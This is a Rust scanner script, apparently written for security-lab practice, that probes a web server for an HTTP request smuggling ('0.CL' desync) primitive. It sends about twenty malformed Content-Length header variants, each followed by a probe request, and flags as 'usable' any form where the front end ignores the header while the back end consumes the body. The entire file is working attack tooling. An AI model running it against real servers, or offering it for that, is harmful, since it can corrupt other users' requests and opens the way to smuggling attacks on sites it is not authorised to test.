#!/usr/bin/env rust-script
//! name: clform_scan
//! description: 0.CL 原语形态扫描件 - 对每种畸变 Content-Length 头形态做判定实验:先单发 A(静态路径 + 该形态声明 N 字节体 + 无体),800ms 内看 A 的响应是否立即回来(立即回来=前端没等体,即前端忽略该头);再单发 B(一个干净探针请求),看 B 是否被吃掉前缀(400/坏行=有人按该头吃体)。判定「前端忽略 + 后端吃体」只有一种组合:A 立即回 + B 被打坏。一个信封给出逐形态的 a1/b 状态与三分判决(FE_WAIT/IGNORED/SPLIT)。
//! version: 1.0.0
//! args: <base-url> [--path P] [--probe Q] [--cl N] [--first-ms N] [--second-ms N] [--forms 'f1|f2|f3'] [--selftest]
//! keywords: smuggling, 0cl, cl0, desync, content-length, form, scan, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut s;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(120))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

fn drain(s: &mut Tls, total_ms: u64, idle_ms: u64) -> Vec<u8> {
    let start = Instant::now();
    let mut buf: Vec<u8> = Vec::new();
    let mut last = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        timeout::check();
        if start.elapsed() >= Duration::from_millis(total_ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                last = Instant::now();
            }
            Err(_) => {
                if !buf.is_empty() && last.elapsed() >= Duration::from_millis(idle_ms) {
                    break;
                }
                if buf.is_empty() && idle_ms == 0 {
                    break;
                }
            }
        }
    }
    buf
}

fn classify(buf: &[u8]) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    let mut statuses: Vec<String> = Vec::new();
    for (off, _) in text.match_indices("HTTP/1.") {
        let rest = &text[off..];
        let end = rest.find("\r\n").unwrap_or(rest.len());
        let line = &rest[..end];
        let mut it = line.split(' ');
        let ver = it.next().unwrap_or("");
        let code = it.next().unwrap_or("");
        if ver.starts_with("HTTP/1.") && code.len() == 3 && code.chars().all(|c| c.is_ascii_digit()) {
            statuses.push(line.to_string());
        }
    }
    let bad = text.contains("Invalid request") || statuses.iter().any(|s| s.contains(" 400 ") || s.contains(" 501 "));
    json!({
        "bytes": buf.len(),
        "statuses": statuses,
        "status_count": statuses.len(),
        "bad_request": bad,
        "head": text.chars().take(60).collect::<String>(),
    })
}

fn arg_val(argv: &[String], key: &str) -> Option<String> {
    let mut i = 0;
    while i < argv.len() {
        if argv[i] == key {
            return argv.get(i + 1).cloned();
        }
        i += 1;
    }
    None
}

fn default_forms() -> Vec<String> {
    let mut v: Vec<String> = Vec::new();
    let push = |v: &mut Vec<String>, s: &str| v.push(s.to_string());
    push(&mut v, "Content-Length : {N}");        // space before colon
    push(&mut v, "Content-Length\t: {N}");       // tab before colon
    push(&mut v, "Content-Length :{N}");         // space before colon, no space after
    push(&mut v, "Content-Length: {N} ");        // trailing space in value
    push(&mut v, "Content-Length: {N}\t");       // trailing tab in value
    push(&mut v, "Content-Length:{N}");          // no space after colon
    push(&mut v, " Content-Length: {N}");        // leading space in name
    push(&mut v, "\tContent-Length: {N}");       // leading tab in name
    push(&mut v, "Content-Length : {N}\r\nContent-Length: 0");
    push(&mut v, "Content-Length: {N}\r\nContent-Length: 0");
    push(&mut v, "Content-Length: 0\r\nContent-Length : {N}");
    push(&mut v, "Content-Length: 0\r\nContent-Length: {N}");
    push(&mut v, "Content-Length: {N}, 0");
    push(&mut v, "Content-Length: 0, {N}");
    push(&mut v, "Content-Length: 0{N}");
    push(&mut v, "Content-Length: +{N}");
    push(&mut v, "Content-Length: {N}\r\nContent-Length: {N}");
    push(&mut v, "Content-Length: {N}\rX-Trim: y");
    push(&mut v, "Content-Length\t: {N}\t");
    push(&mut v, "content-length : {N}");
    push(&mut v, "Content-Length : {N}\r\nConnection: keep-alive\r\nContent-Length: 0");
    v
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    if argv.iter().any(|a| a == "--selftest") {
        let v = classify(b"HTTP/1.1 200 OK\r\n\r\nHTTP/1.1 400 Bad Request\r\n\r\n{\"error\":\"Invalid request\"}");
        let ok = v["status_count"] == 2 && v["bad_request"] == true;
        pi_rust_lib::report::success("clform_scan", json!({"selftest": if ok {"ok"} else {"fail"}, "v": v}), "classifier is the pure root").unwrap_or(());
        return;
    }
    let mut base = String::new();
    for a in &argv {
        if !a.starts_with("--") {
            base = a.clone();
            break;
        }
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("clform_scan", "usage", "call as: clform_scan <base-url> [--path /resources/images/blog.svg] [--probe /resources/css/labsBlog.css] [--cl 64]");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = arg_val(&argv, "--host").unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);
    let path = arg_val(&argv, "--path").unwrap_or_else(|| "/resources/images/blog.svg".to_string());
    let probe = arg_val(&argv, "--probe").unwrap_or_else(|| "/resources/css/labsBlog.css".to_string());
    let cl: u64 = arg_val(&argv, "--cl").and_then(|v| v.parse().ok()).unwrap_or(64);
    let first_ms: u64 = arg_val(&argv, "--first-ms").and_then(|v| v.parse().ok()).unwrap_or(900);
    let second_ms: u64 = arg_val(&argv, "--second-ms").and_then(|v| v.parse().ok()).unwrap_or(1800);
    let forms_arg = arg_val(&argv, "--forms");
    let forms: Vec<String> = match forms_arg {
        Some(s) => s.split('|').map(|x| x.to_string()).collect(),
        None => default_forms(),
    };

    let mut rows: Vec<Value> = Vec::new();
    let mut splits: Vec<String> = Vec::new();
    let mut last_err = String::new();
    for (idx, tmpl) in forms.iter().enumerate() {
        timeout::check();
        let form = tmpl.replace("{N}", &cl.to_string());
        let a_path = format!("{path}?sr={idx}");
        let b_path = format!("{probe}?sr={idx}");
        let mut row = json!({"idx": idx, "form": form});
        match connect(&host, port) {
            Ok(mut c) => {
                let a = format!("GET {a_path} HTTP/1.1\r\nHost: {host}\r\n{form}\r\nConnection: keep-alive\r\n\r\n");
                if c.write_all(a.as_bytes()).is_err() {
                    last_err = "a write".to_string();
                    rows.push(row);
                    continue;
                }
                let _ = c.flush();
                let a1 = drain(&mut c, first_ms, 250);
                row["a1"] = classify(&a1);
                let b = format!("GET {b_path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n");
                if c.write_all(b.as_bytes()).is_err() {
                    last_err = "b write".to_string();
                    rows.push(row);
                    continue;
                }
                let _ = c.flush();
                let b1 = drain(&mut c, second_ms, 400);
                let cb = classify(&b1);
                row["b"] = cb.clone();
                let a1_seen = row["a1"]["status_count"].as_u64().unwrap_or(0) > 0;
                let b_bad = cb["bad_request"].as_bool().unwrap_or(false);
                let verdict = if !a1_seen {
                    "FE_WAIT"
                } else if b_bad {
                    "SPLIT"
                } else {
                    "IGNORED"
                };
                row["verdict"] = json!(verdict);
                if verdict == "SPLIT" {
                    splits.push(form.clone());
                }
            }
            Err(e) => {
                row["error"] = json!(e.clone());
                last_err = e;
            }
        }
        rows.push(row);
    }

    pi_rust_lib::report::success(
        "clform_scan",
        json!({
            "url": base,
            "host": host,
            "path": path,
            "probe": probe,
            "cl": cl,
            "splits": splits,
            "rows": rows,
            "last_error": last_err,
        }),
        "a form whose verdict is SPLIT (A answered immediately AND the probe mangled) is the usable 0.CL primitive",
    )
    .unwrap_or(());
}
